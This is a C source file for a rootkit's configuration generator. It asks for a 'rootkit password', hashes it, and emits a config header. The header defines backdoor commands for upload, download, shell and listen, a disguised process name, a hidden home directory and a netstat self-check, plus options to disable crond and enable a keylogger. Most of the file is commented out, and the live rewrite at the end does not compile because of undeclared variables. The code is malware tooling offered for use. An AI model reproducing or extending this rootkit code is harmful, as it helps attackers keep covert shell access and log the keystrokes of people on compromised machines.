/*#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <string.h>
#include <time.h>

#include "config_def.h"
#include "sha1.h"
#include "crypto.h"

#define SR (unsigned int) ((unsigned long) rand() ^ ((unsigned long) rand() << 1))

int	main()
{
        struct  termios old, new;
	char	p1[256], p2[256], *t;
	struct	hash h;
	int	i;

        tcgetattr(0, &old);
        new = old;
        new.c_lflag &= ~(ICANON | ECHO | ISIG);
        new.c_iflag &= ~(IXON | IXOFF);

	printf("#ifndef CONFIG_H\n"
			 "#define CONFIG_H\n"
			 "#define ECHAR           0x0b\n"
			 "#define WCHAR           0x0c\n"
			 "#define ENVLEN      	64\n"
			 "#define BDTIMEOUT   	120\n"
			 "#define UPLOAD          1\n"
			 "#define DOWNLOAD        2\n"
			 "#define SHELL           3\n"
			 "#define CHECK			  4\n"
			 "#define LISTEN          5\n"
			 "#define WNOHANG         0x00000001\n"
			 "#define BUFSIZE         16384\n"
			 "#define CHECKSTR		  \"skd_check\"\n"
			 );
	
	
	while (1) {
	    tcsetattr(0, TCSAFLUSH, &new);
		fprintf(stderr, "Please enter new rootkit password:");
		fflush(stderr);
		fgets(p1, 255, stdin);
		fprintf(stderr, "\nAgain, just to be sure:");
		fflush(stderr);
		fgets(p2, 255, stdin);
	        tcsetattr(0, TCSAFLUSH, &old);
		if (!*p1 || !*p2 || *p1 == '\n' || *p2 == '\n') {
			fprintf(stderr, "\n--- Aborted! ---\n");
			return 1;
		}
		if (!strcmp(p1, p2)) {
			fprintf(stderr, "\nOK, new password set.\n");
			break;
		} else {
			fprintf(stderr,
				"\nMistyped password, next please...\n");
		}
	}
	hash160(p1, strlen(p1), &h);
	printf("#define\tHASHPASS\t\"");
	for (i = 0; i < 20; i++) {
		printf("\\x%02x", h.val[i]);
	}
	printf("\"\n");
	fprintf(stderr, "Home directory [%s]: ", HOME); fflush(stderr);
	fgets(p1, 255, stdin);
	if ((!*p1) || (*p1 == '\n'))
		strcpy(p1, HOME);
	
	t = strchr(p1, '\n');
	if (t) {
		*t = 0;
	}

//	fprintf(stderr, "Magic file-hiding suffix [%s]: ", DEFHIDE);
//	fflush(stderr);

//	fgets(p2, 255, stdin);
//	if ((!*p2) || (*p2 == '\n'))
//		strcpy(p2, DEFHIDE);

//	t = strchr(p2, '\n');
//	if (t) {
//		*t = 0;
//	}


	printf("#define\tHOME\t\"%s\"\n", p1);


	fprintf(stderr, "Process name (if the length permits) %s: ", PROC_NAME); fflush(stderr);
	fgets(p1, 255, stdin);
	if ((!*p1) || (*p1 == '\n'))
			strcpy(p1, PROC_NAME);

	t = strchr(p1, '\n');
	if (t) {
			*t = 0;
	}
	printf("#define\tPROC_NAME\t\"%s\"\n", p1);
	p1[0] = ' ';
	p1[strlen(p1)-1] = '\0';
	printf("#define\tPROC_DETECT\t\"netstat -lnwp | grep -q%s\"\n", p1);
	
	//DEBUG?	
	fprintf(stderr, "If you want debug, type \"yes\": "); fflush(stderr);
	fgets(p1, 255, stdin);
	t = strchr(p1, '\n');
	if (t) {
			*t = 0;
	}
	if (strcmp(p1,"yes")==0){
		printf("#define\tDEBUG\t\"%s\"\n", p1);
	}
		
	//CROND?
	fprintf(stderr, "If you want to DISABLE crond, type \"no\": "); fflush(stderr);
	fgets(p1, 255, stdin);
	t = strchr(p1, '\n');
	if (t) {
			*t = 0;
	}
	if (strcmp(p1,"no")==0){
		printf("#define\tCROND\t\"%s\"\n", p1);
	}
	
	//KEYLOGGER?
	fprintf(stderr, "If you want to enable the keylogger, type \"yes\": "); fflush(stderr);
	fgets(p1, 255, stdin);
	t = strchr(p1, '\n');
	if (t) {
			*t = 0;
	}
	if (strcmp(p1,"yes")==0){
		printf("#define\tKEYLOGGER\t\"%s\"\n", p1);
	}

	printf("#endif\n");
	srand(time(NULL));

	return 0;
}
*/
#include <stdio.h>

#define PASSLENGTH 256

int main(int argc, char *argv[]) {

    struct termios old, new;
	char pass1[PASSLENGTH], pass2[PASSLENGTH], *t;
	struct	hash h;
	int	i;

	// Hide password while typing
    tcgetattr(0, &old);
    new = old;
    new.c_lflag &= ~(ECHO);
	tcsetattr(0, TCSAFLUSH, &new);


	while (1) {
		fprintf(stderr, "Please enter new rootkit password:");
		fflush(stderr);
		fgets(pass1, PASSLENGTH, stdin);
		fprintf(stderr, "\nAgain, just to be sure:");
		fflush(stderr);
		fgets(pass2, PASSLENGTH, stdin);
	    tcsetattr(0, TCSAFLUSH, &old);
		if (!*pass1 || !*pass2 || *pass1 == '\n' || *pass2 == '\n') {
			fprintf(stderr, "\n--- Aborted! ---\n");
			return 1;
		}
		if (!strcmp(p1, p2)) {
			fprintf(stderr, "\nOK, new password set.\n");
			break;
		} else {
			fprintf(stderr, "Mistyped password or empty, next please...\n");
		}
	}

	return 0;
}
